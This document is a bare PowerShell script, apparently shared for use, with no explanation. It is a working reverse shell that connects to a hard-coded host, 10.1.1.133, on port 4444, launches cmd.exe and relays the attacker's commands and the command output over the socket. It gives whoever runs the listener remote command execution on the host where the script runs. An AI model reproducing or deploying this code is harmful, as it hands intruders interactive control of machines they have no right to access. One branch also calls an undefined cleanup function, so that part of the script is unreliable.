function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a="10.1.1.133"; $port="4444";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize ;$p=New-Object System.Diagnostics.Process ;$p.StartInfo.FileName="cmd.exe" ;$p.StartInfo.RedirectStandardInput=1 ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0 ;$p.Start() ;$is=$p.StandardInput ;$os=$p.StandardOutput ;Start-Sleep 1 ;$e=new-object System.Text.AsciiEncoding ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length) ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}} if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else { $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=" "}} $s.Write($e.GetBytes($out),0,
$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};
